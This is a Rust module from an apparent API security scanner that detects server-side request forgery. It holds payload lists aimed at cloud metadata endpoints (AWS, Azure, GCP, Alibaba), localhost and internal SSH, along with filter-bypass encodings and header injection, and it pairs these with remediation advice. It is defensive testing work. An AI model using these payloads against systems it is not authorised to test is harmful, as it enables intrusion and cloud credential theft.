use async_trait::async_trait;

use nevelio_core::types::{Endpoint, Finding, ParameterLocation, Severity};
use nevelio_core::{AttackModule, HttpClient, ScanSession};

// ---------------------------------------------------------------------------
// Probe definitions
// ---------------------------------------------------------------------------

struct SsrfProbe {
    url: &'static str,
    description: &'static str,
    /// Strings that confirm successful SSRF if found in the response body
    indicators: &'static [&'static str],
}

const PROBES: &[SsrfProbe] = &[
    SsrfProbe {
        url: "http://169.254.169.254/latest/meta-data/",
        description: "AWS EC2 Instance Metadata Service (IMDSv1)",
        indicators: &["ami-id", "instance-id", "local-ipv4", "security-credentials", "iam"],
    },
    SsrfProbe {
        url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        description: "Azure Instance Metadata Service",
        indicators: &["vmId", "subscriptionId", "resourceGroupName", "location", "osType"],
    },
    SsrfProbe {
        url: "http://metadata.google.internal/computeMetadata/v1/",
        description: "GCP Compute Engine Metadata",
        indicators: &["project/", "instance/", "serviceAccounts/"],
    },
    SsrfProbe {
        url: "http://100.100.100.200/latest/meta-data/",
        description: "Alibaba Cloud ECS Metadata",
        indicators: &["instance-id", "eipv4", "vpc-id"],
    },
    SsrfProbe {
        url: "http://localhost/",
        description: "Accès localhost",
        indicators: &["localhost", "127.0.0.1", "::1"],
    },
    SsrfProbe {
        url: "http://127.0.0.1:22/",
        description: "Port SSH interne (127.0.0.1:22)",
        indicators: &["ssh", "openssh", "SSH-"],
    },
    SsrfProbe {
        url: "http://0.0.0.0/",
        description: "Bind address 0.0.0.0",
        indicators: &[],
    },
];

// Bypass techniques — alternative representations of 127.0.0.1 / 169.254.x
// that evade naive blocklists based on string matching.
struct SsrfBypass {
    url: &'static str,
    description: &'static str,
}

const BYPASS_PROBES: &[SsrfBypass] = &[
    // IPv6 representations
    SsrfBypass { url: "http://[::1]/",               description: "IPv6 loopback ::1" },
    SsrfBypass { url: "http://[::ffff:127.0.0.1]/",  description: "IPv4-mapped IPv6 loopback" },
    SsrfBypass { url: "http://[::ffff:7f00:1]/",     description: "IPv4-mapped IPv6 loopback (hex)" },
    // Decimal notation
    SsrfBypass { url: "http://2130706433/",           description: "127.0.0.1 en décimal (2130706433)" },
    SsrfBypass { url: "http://2852039166/",           description: "169.254.169.254 en décimal" },
    // Octal notation
    SsrfBypass { url: "http://0177.0.0.1/",          description: "127.0.0.1 en octal" },
    // URL-encoded
    SsrfBypass { url: "http://%31%32%37%2e%30%2e%30%2e%31/", description: "127.0.0.1 URL-encoded" },
    // Shortened / redirect domains known to point to localhost
    SsrfBypass { url: "http://127.0.0.1.nip.io/",   description: "nip.io wildcard DNS → 127.0.0.1" },
    SsrfBypass { url: "http://localtest.me/",        description: "localtest.me → 127.0.0.1" },
];

/// HTTP headers that may be used to inject SSRF targets
const SSRF_HEADERS: &[&str] = &[
    "X-Forwarded-Host",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Originating-IP",
    "True-Client-IP",
    "X-Client-IP",
];

/// Parameter names commonly used to pass URLs — prime SSRF candidates
const URL_PARAMS: &[&str] = &[
    "url", "uri", "redirect", "redirect_url", "redirect_uri", "next", "return",
    "return_url", "returnUrl", "callback", "callback_url", "callbackUrl",
    "destination", "dest", "target", "goto", "link", "href", "src", "source",
    "host", "endpoint", "remote", "fetch", "load", "include", "import",
    "proxy", "webhook", "action", "path", "file", "page", "site", "domain",
];

// ---------------------------------------------------------------------------
// Module
// ---------------------------------------------------------------------------

pub struct SsrfModule;

#[async_trait]
impl AttackModule for SsrfModule {
    fn name(&self) -> &str {
        "ssrf"
    }

    fn description(&self) -> &str {
        "Détecte les Server-Side Request Forgery (SSRF) vers IMDS cloud, localhost et services internes"
    }

    async fn run(
        &self,
        _session: &ScanSession,
        client: &HttpClient,
        endpoints: &[Endpoint],
    ) -> Vec<Finding> {
        let mut findings = Vec::new();

        for ep in endpoints {
            // Collect URL-candidate parameters from the spec or fall back to the known list
            let candidates: Vec<String> = {
                let spec_url_params: Vec<String> = ep
                    .parameters
                    .iter()
                    .filter(|p| {
                        matches!(p.location, ParameterLocation::Query | ParameterLocation::Body)
                            && URL_PARAMS.iter().any(|known| {
                                p.name.to_lowercase().contains(known)
                            })
                    })
                    .map(|p| p.name.clone())
                    .collect();

                if spec_url_params.is_empty() {
                    URL_PARAMS.iter().map(|s| s.to_string()).collect()
                } else {
                    spec_url_params
                }
            };

            for param in &candidates {
                if let Some(f) = probe_ssrf(client, ep, param).await {
                    findings.push(f);
                    break; // one finding per endpoint is enough
                }
            }

            // Header-based SSRF
            if let Some(f) = check_header_ssrf(client, ep).await {
                findings.push(f);
            }

            // Bypass techniques (IPv6, decimal, URL-encoded, etc.)
            for param in &candidates {
                if let Some(f) = probe_ssrf_bypass(client, ep, param).await {
                    findings.push(f);
                    break;
                }
            }
        }

        findings
    }
}

// ---------------------------------------------------------------------------
// Core SSRF probe logic
// ---------------------------------------------------------------------------

async fn probe_ssrf(
    client: &HttpClient,
    ep: &Endpoint,
    param: &str,
) -> Option<Finding> {
    for probe in PROBES {
        let result = send_ssrf_request(client, ep, param, probe.url).await?;

        let body_lower = result.body.to_lowercase();
        let probe_url_lower = probe.url.to_lowercase();

        // Confirmed SSRF: specific indicators found in response body
        let confirmed = probe.indicators.iter().any(|i| body_lower.contains(&i.to_lowercase()));

        // Probable SSRF: server fetched the URL (200 with non-empty body that echoes back the probe URL)
        let probable = !confirmed
            && result.status == 200
            && !result.body.is_empty()
            && result.body.len() > 50
            && (body_lower.contains("169.254") || body_lower.contains(&probe_url_lower));

        if confirmed || probable {
            let severity = if confirmed { Severity::Critical } else { Severity::High };
            let cvss    = if confirmed { 9.8 } else { 7.5 };

            let mut f = Finding::new(
                format!("SSRF — paramètre `{}` → {}", param, probe.description),
                severity,
                cvss,
                "ssrf",
                ep.full_url.clone(),
                ep.method.clone(),
            );
            f.description = format!(
                "Le paramètre `{}` de l'endpoint {} a été utilisé pour déclencher une requête \
                 vers `{}` ({}). Un attaquant peut accéder à des métadonnées cloud, des services \
                 internes ou des ressources protégées.",
                param, ep.full_url, probe.url, probe.description
            );
            f.proof = format!(
                "Paramètre injecté: {}={}\nRéponse HTTP {}: {}",
                param,
                probe.url,
                result.status,
                result.body.chars().take(300).collect::<String>()
            );
            f.recommendation =
                "Valider strictement les URLs fournies par l'utilisateur via une allowlist de domaines \
                 autorisés. Bloquer les plages d'adresses privées (10.x, 172.16.x, 192.168.x, 169.254.x) \
                 au niveau réseau. Utiliser IMDSv2 (AWS) avec en-tête de session requis. \
                 Ne jamais exposer directement les paramètres d'URL à des clients non authentifiés."
                    .to_string();
            f.cwe = Some("CWE-918".to_string());
            f.references = vec![
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery".to_string(),
                "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html".to_string(),
                "https://portswigger.net/web-security/ssrf".to_string(),
            ];
            return Some(f);
        }
    }

    None
}

struct ProbeResult {
    status: u16,
    body: String,
}

async fn send_ssrf_request(
    client: &HttpClient,
    ep: &Endpoint,
    param: &str,
    probe_url: &str,
) -> Option<ProbeResult> {
    let method: reqwest::Method = ep.method.parse().unwrap_or(reqwest::Method::GET);

    let resp = if matches!(ep.method.as_str(), "GET" | "HEAD" | "DELETE") {
        let sep = if ep.full_url.contains('?') { '&' } else { '?' };
        let url = format!("{}{}{}={}", ep.full_url, sep, param, urlenc(probe_url));
        let req = client.inner().request(method, &url).build().ok()?;
        client.send(req).await.ok()?
    } else {
        let body = serde_json::json!({ param: probe_url });
        let req = client
            .inner()
            .request(method, &ep.full_url)
            .header("Content-Type", "application/json")
            .body(body.to_string())
            .build()
            .ok()?;
        client.send(req).await.ok()?
    };

    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();
    Some(ProbeResult { status, body })
}

fn urlenc(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 3);
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9'
            | b'-' | b'_' | b'.' | b'~' => out.push(b as char),
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

// ---------------------------------------------------------------------------
// Check: SSRF via HTTP headers (X-Forwarded-Host, etc.)
// ---------------------------------------------------------------------------

async fn check_header_ssrf(client: &HttpClient, ep: &Endpoint) -> Option<Finding> {
    // Only probe a subset of cloud IMDS endpoints to keep tests fast
    let header_probes = [
        ("http://169.254.169.254/", &["ami-id", "instance-id", "local-ipv4", "iam"][..]),
        ("http://localhost/", &["localhost", "127.0.0.1"][..]),
    ];

    for (probe_url, indicators) in &header_probes {
        for header_name in SSRF_HEADERS {
            let method: reqwest::Method = ep.method.parse().unwrap_or(reqwest::Method::GET);
            let Ok(req) = client
                .inner()
                .request(method, &ep.full_url)
                .header(*header_name, *probe_url)
                .build()
            else {
                continue;
            };

            let Ok(resp) = client.send(req).await else { continue };
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            let body_lower = body.to_lowercase();

            let confirmed = indicators.iter().any(|i| body_lower.contains(i));
            let probable = !confirmed
                && status == 200
                && body.len() > 50
                && body_lower.contains("169.254");

            if confirmed || probable {
                let severity = if confirmed { Severity::Critical } else { Severity::High };
                let cvss = if confirmed { 9.8 } else { 7.5 };
                let confidence = if confirmed { "Confirmé" } else { "Probable" };

                let mut f = Finding::new(
                    format!("SSRF via header `{}` — {}", header_name, ep.full_url),
                    severity,
                    cvss,
                    "ssrf",
                    ep.full_url.clone(),
                    ep.method.clone(),
                );
                f.description = format!(
                    "Le header HTTP `{}` est utilisé pour déclencher une requête interne vers `{}`. \
                     Un attaquant peut accéder aux métadonnées cloud ou à des services internes \
                     en injectant des IPs privées dans ce header.",
                    header_name, probe_url
                );
                f.proof = format!(
                    "{} — `{}: {}` → HTTP {} avec indicateurs dans la réponse: {}",
                    confidence, header_name, probe_url, status,
                    body.chars().take(200).collect::<String>()
                );
                f.recommendation =
                    "Ne jamais faire confiance aux headers X-Forwarded-* pour construire des URLs \
                     internes. Valider et normaliser les IPs sources côté infrastructure. \
                     Bloquer les plages d'adresses privées au niveau du pare-feu."
                        .to_string();
                f.cwe = Some("CWE-918".to_string());
                f.references = vec![
                    "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery".to_string(),
                    "https://portswigger.net/web-security/ssrf".to_string(),
                ];
                return Some(f);
            }
        }
    }

    None
}

// ---------------------------------------------------------------------------
// Check: SSRF via bypass techniques
// ---------------------------------------------------------------------------

async fn probe_ssrf_bypass(
    client: &HttpClient,
    ep: &Endpoint,
    param: &str,
) -> Option<Finding> {
    let method: reqwest::Method = ep.method.parse().unwrap_or(reqwest::Method::GET);

    for bypass in BYPASS_PROBES {
        let result = if matches!(ep.method.as_str(), "GET" | "HEAD" | "DELETE") {
            let sep = if ep.full_url.contains('?') { '&' } else { '?' };
            let url = format!("{}{}{}={}", ep.full_url, sep, param, urlenc(bypass.url));
            let Ok(req) = client.inner().request(method.clone(), &url).build() else { continue };
            client.send(req).await.ok()?
        } else {
            let body = serde_json::json!({ param: bypass.url });
            let Ok(req) = client
                .inner()
                .request(method.clone(), &ep.full_url)
                .header("Content-Type", "application/json")
                .body(body.to_string())
                .build()
            else {
                continue;
            };
            client.send(req).await.ok()?
        };

        let status = result.status().as_u16();
        let body = result.text().await.unwrap_or_default();
        let body_lower = body.to_lowercase();

        // Any 200 response containing localhost/loopback indicators is suspicious
        let bypass_hit = status == 200
            && (body_lower.contains("localhost")
                || body_lower.contains("127.0.0.1")
                || body_lower.contains("::1")
                || body.len() > 100); // non-empty 200 on a loopback address is suspicious

        if bypass_hit {
            let mut f = Finding::new(
                format!("SSRF Bypass — `{}` via {}", param, bypass.description),
                Severity::Critical,
                9.8,
                "ssrf",
                ep.full_url.clone(),
                ep.method.clone(),
            );
            f.description = format!(
                "Le paramètre `{}` est vulnérable au SSRF via une technique de bypass : {} (`{}`). \
                 Les filtres basés sur la correspondance de chaînes (\"127.0.0.1\", \"localhost\") \
                 peuvent être contournés par des représentations alternatives.",
                param, bypass.description, bypass.url
            );
            f.proof = format!(
                "Payload: {}={}\nHTTP {} — réponse: {}",
                param,
                bypass.url,
                status,
                body.chars().take(200).collect::<String>()
            );
            f.recommendation =
                "Valider les URLs côté serveur en résolvant le nom d'hôte DNS et en comparant \
                 l'adresse IP résolue contre une liste de plages bloquées (RFC 1918, 169.254.x.x, ::1). \
                 Ne pas se fier à la représentation textuelle de l'URL."
                    .to_string();
            f.cwe = Some("CWE-918".to_string());
            f.references = vec![
                "https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses".to_string(),
                "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html".to_string(),
            ];
            return Some(f);
        }
    }

    None
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn urlenc_encodes_colon_slash() {
        let encoded = urlenc("http://127.0.0.1/");
        assert!(encoded.contains("%3A"), "colon not encoded: {encoded}");
        assert!(encoded.contains("%2F"), "slash not encoded: {encoded}");
    }

    #[test]
    fn urlenc_safe_chars_unchanged() {
        assert_eq!(urlenc("abc-123_test.ok~"), "abc-123_test.ok~");
    }

    #[test]
    fn probes_list_non_empty() {
        assert!(!PROBES.is_empty());
    }

    #[test]
    fn url_params_list_contains_common_names() {
        assert!(URL_PARAMS.contains(&"url"));
        assert!(URL_PARAMS.contains(&"redirect"));
        assert!(URL_PARAMS.contains(&"webhook"));
    }

    #[test]
    fn ssrf_module_name() {
        assert_eq!(SsrfModule.name(), "ssrf");
    }
}
